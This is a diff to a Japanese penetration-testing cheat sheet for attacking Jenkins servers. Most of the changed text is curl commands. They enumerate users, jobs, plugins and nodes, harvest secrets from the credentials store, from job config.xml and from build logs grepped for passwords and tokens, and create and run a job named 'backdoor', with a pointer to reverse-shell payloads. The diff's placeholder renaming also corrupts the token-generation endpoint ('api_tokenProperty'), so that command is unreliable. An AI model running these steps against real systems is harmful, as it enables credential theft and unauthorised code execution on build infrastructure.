@@ -9,34 +9,20 @@
 
 ---
 
-# Jenkinsが使われているときの出力
-
-```powershell
-# winpeas
-ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
-È Check for services restricted from the outside 
-  Enumerating IPv4 connections
-   =================================================================================
-Protocol Local AddressLocal PortRemote Address Remote Port State Process ID Process Name
-
-TCP 0.0.0.0 8080 0.0.0.0  0 Listening  3944java
-```
-
----
-
 # 接続
 
-- [Authenticating scripted clients  - Jenkins](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/)
+- 🔗[Authenticating scripted clients  - Jenkins](https://www.jenkins.io/doc/book/system-administration/authenticating-scripted-clients/)
 - パスワードベース認証とAPI token認証方式がある
+
 >Jenkins は認証ネゴシエーションを一切行わないことに注意してください。つまり、401 (Unauthorized) 応答ではなく 403 (Forbidden) 応答を直ちに返すため、最初のリクエストから認証情報を送信するようにしてください (「**事前認証**」とも呼ばれます)。
 
 ## HTTP(s)
 
 ```zsh
-curl -X POST -L --user <username>:<pw|apiToken> <url>
+curl -X POST -L --user <username>:<password|api_token> <url>
 ```
 ```zsh
-wget --auth-no-challenge --user=<username> --password=<pw|apiToken> <url>
+wget --auth-no-challenge --user=<username> --password=<password|api_token> <url>
 ```
 
 代表的なパス
@@ -60,7 +46,7 @@ wget <url>/jnlpJars/jenkins-cli.jar
 
 認証付きCLI接続
 ```zsh
-java -jar jenkins-cli.jar -s <url> -auth <username>:<pw> who-am-i
+java -jar jenkins-cli.jar -s <url> -auth <username>:<password> who-am-i
 ```
 
 ## Jenkins API（REST）
@@ -70,13 +56,13 @@ java -jar jenkins-cli.jar -s <url> -auth <username>:<pw> who-am-i
 curl <url>/api/json
 
 # 認証付き
-curl --user <username>:<apiToken> <url>/api/json
+curl --user <username>:<api_token> <url>/api/json
 ````
 
-ジョブ一覧(`[name]`は変更せず指定)
+ジョブ一覧（`[name]`は変更せずそのまま入力）
 ```zsh
 # url一覧も欲しい場合は、[name,url]とする
-curl --user <username>:<apiToken> <url>/api/json?tree=jobs[name]
+curl --user <username>:<api_token> <url>/api/json?tree=jobs[name]
 ```
 
 ---
@@ -118,61 +104,61 @@ curl -s <url>/log/all
 
 # Enumeration
 
-anonymousログインが可能であれば、`--user`は不要
+anonymousログインが可能であれば、`--user`以降は不要。
 
 ユーザー確認
 ```zsh
-curl -s <url>/asynchPeople/ --user <username>:<pw|apiToken>
+curl -s <url>/asynchPeople/ --user <username>:<password|api_token>
 
 # ユーザーAPIの確認
-curl <url>/user/admin/api/json --user <username>:<pw|apiToken>
+curl <url>/user/admin/api/json --user <username>:<password|api_token>
 
 # signupページの確認
-curl <url>/signup --user <username>:<pw|apiToken>
+curl <url>/signup --user <username>:<password|api_token>
 ```
 
 ジョブ列挙
 ```zsh
-curl <url>/api/json?tree=jobs[name,url] --user <username>:<pw|apiToken>
+curl <url>/api/json?tree=jobs[name,url] --user <username>:<password|api_token>
 
 # ビルド情報
-curl --user <username>:<pw|apiToken> \
+curl --user <username>:<password|api_token> \
   <url>/job/<job-name>/api/json?tree=builds[number,url]
 ````
 
 コンソール出力
 ```zsh
-curl <url>/job/<job-name>/lastBuild/consoleText --user <username>:<pw|apiToken>
+curl <url>/job/<job-name>/lastBuild/consoleText --user <username>:<password|api_token>
 ```
 
 プラグイン列挙
 ```zsh
-curl <url>/pluginManager/api/json?depth=1 --user <username>:<pw|apiToken>
+curl <url>/pluginManager/api/json?depth=1 --user <username>:<password|api_token>
 ````
 - → 脆弱なプラグインがあれば要確認
 
 認証情報探索
 ```zsh
 # Jenkins credentials storage
-curl --user <username>:<pw|apiToken> <url>/credentials/
+curl --user <username>:<password|api_token> <url>/credentials/
 
 # ジョブ定義内の平文データ 
-curl --user <username>:<pw|apiToken> <url>/job/<job-name>/config.xml
+curl --user <username>:<password|api_token> <url>/job/<job-name>/config.xml
 
 # ビルドログからパス/トークン検索
-curl --user <username>:<pw|apiToken> \
+curl --user <username>:<password|api_token> \
   <url>/job/<job-name>/lastBuild/consoleText \
   | grep -i "password\|secret\|token"
 ```
 
 ノード（ビルドノード）列挙
 ```zsh
-curl --user <username>:<pw|apiToken> <url>/computer/api/json
+curl --user <username>:<password|api_token> <url>/computer/api/json
 ````
 
 システム情報
 ```zsh
-curl --user <username>:<pw|apiToken> <url>/systemInfo
+curl --user <username>:<password|api_token> <url>/systemInfo
 ```
 
 ---
@@ -221,7 +207,7 @@ $$revshells.com$$
 ```zsh
 curl -X POST \
   <url>/createItem?name=backdoor \
-  --user <username>:<pw|apiToken> \
+  --user <username>:<password|api_token> \
   --data-binary @job-config.xml \
   -H "Content-Type: application/xml"
 ```
@@ -237,14 +223,14 @@ curl -X POST \
 ```zsh
 curl -X POST \
   <url>/job/backdoor/build \
-  --user <username>:<pw|apiToken>
+  --user <username>:<password|api_token>
 ```
 
 ## APIトークンの生成
 
 APIトークン生成
 ```zsh
-curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.ApiTokenProperty/generateNewToken \
+curl -X POST \  <url>/user/<username>/descriptorByName/jenkins.security.api_tokenProperty/generateNewToken \
   --user <username>:<password> \
   -d "newTokenName=<token>"
 ````
